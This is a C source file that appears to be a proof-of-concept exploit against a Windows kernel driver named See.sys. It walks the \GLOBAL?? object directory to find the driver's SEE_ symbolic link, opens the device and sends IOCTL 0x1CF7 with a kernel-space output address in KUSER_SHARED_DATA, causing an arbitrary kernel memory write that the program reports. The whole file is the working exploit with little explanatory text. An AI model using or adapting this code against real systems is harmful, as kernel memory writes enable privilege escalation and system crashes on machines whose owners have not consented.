#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Define from: https://docs.microsoft.com/en-us/windows/desktop/DevNotes/ntopendirectoryobject
#define DIRECTORY_QUERY	1

// Struct from: https://docs.microsoft.com/en-us/windows/desktop/devnotes/ntquerydirectoryobject
typedef struct _OBJDIR_INFORMATION {
    UNICODE_STRING	ObjectName;
    UNICODE_STRING  ObjectTypeName;
} OBJDIR_INFORMATION, *POBJDIR_INFORMATION;

typedef NTSTATUS(WINAPI* pNtOpenDirectoryObject) (PHANDLE DirectoryHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);

typedef NTSTATUS(WINAPI* pNtQueryDirectoryObject) (HANDLE DirectoryHandle, PVOID Buffer, ULONG Length, BOOLEAN ReturnSingleEntry,
	BOOLEAN RestartScan, PULONG Context, PULONG ReturnLength);

typedef unsigned long long QWORD; // DWORD64
void main()
{
    pNtQueryDirectoryObject NtQueryDirectoryObject;
    pNtOpenDirectoryObject  NtOpenDirectoryObject;
    POBJDIR_INFORMATION	    pObjDir;
    OBJECT_ATTRIBUTES       ntAttributes;
    UNICODE_STRING          usDirectory;
    LPCWSTR                 szDriverName;
    HANDLE                  hNtdll;
    HANDLE                  hDirectory;
    HANDLE                  hDriver;
    LPVOID                  lpHeap;
    LPVOID                  lpInputBuffer;
    LPVOID                  lpOutputBuffer;
    ULONG                   ulCtx;
    ULONG                   ulReturnLength;
    DWORD                   dwHeapSize;
    DWORD                   dwIoctl;

    hNtdll = GetModuleHandleA("ntdll.dll");
    NtOpenDirectoryObject = GetProcAddress(hNtdll, "NtOpenDirectoryObject");
    NtQueryDirectoryObject = GetProcAddress(hNtdll, "NtQueryDirectoryObject");
    RtlInitUnicodeString(&usDirectory, L"\\GLOBAL??");
    InitializeObjectAttributes(&ntAttributes, &usDirectory, 0, 0, 0);
    NtOpenDirectoryObject(&hDirectory, DIRECTORY_QUERY, &ntAttributes);
    dwHeapSize = 0x1000;
    lpHeap = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwHeapSize);
    pObjDir = (POBJDIR_INFORMATION)lpHeap;
    while (NtQueryDirectoryObject(hDirectory, lpHeap, dwHeapSize, FALSE, TRUE, &ulCtx, &ulReturnLength) != 0)
    {
        HeapFree(GetProcessHeap(), 0, lpHeap);
        dwHeapSize += 0x1000;
        lpHeap = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwHeapSize);
        pObjDir = (POBJDIR_INFORMATION)lpHeap;
    }
    /* 
        lpHeap && pObjDir should have all the entries of \\GLOBAL??
        Now we need to find the driver starting with SEE_{RANDOM_HEX_DATA}
    */
    for (;;) {
        if (pObjDir->ObjectName.Length == 0) 
        {
            printf("[i] End of \\GLOBAL??\n");
            printf("[!] Unable to find the See.sys' symbolic link\n");
            getchar();
            ExitProcess(-1);
        }
        if (wcsncmp(pObjDir->ObjectName.Buffer, L"SEE_", 4) == 0) 
        {
            szDriverName = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (BYTE*)pObjDir->ObjectName.MaximumLength + 10); // + space for prefix "\\.\"
            lstrcatW(szDriverName, L"\\\\.\\");
            lstrcatW(szDriverName, pObjDir->ObjectName.Buffer);
            hDriver = CreateFileW(szDriverName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, 0);
            if (hDriver != INVALID_HANDLE_VALUE) 
            {
                printf("[i] Found SEE Driver: %ls\n", szDriverName);
                HeapFree(GetProcessHeap(), 0, szDriverName);
                dwIoctl = 0x1CF7;
                lpInputBuffer = VirtualAlloc(0x41000000, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
                /*
                    K_USER_SHARED_DATA = 0xFFFFF78000000000
                    Output Buffer length must be greater than 26 (0x1A)
                */
                printf("[.] Press [ENTER] to send the IOCTL");
                getchar();
                DeviceIoControl(hDriver, dwIoctl, lpInputBuffer, 0x100, 0xFFFFF78000000080, 0x100, NULL, NULL);
                CloseHandle(hDriver);
                printf("[i] The memory write occured! Check the address for the overwritten bytes\n");
                getchar();
                ExitProcess(0);
            }
        }
        pObjDir++; // Point to next OBJDIR_INFORMATION struct
    }
}
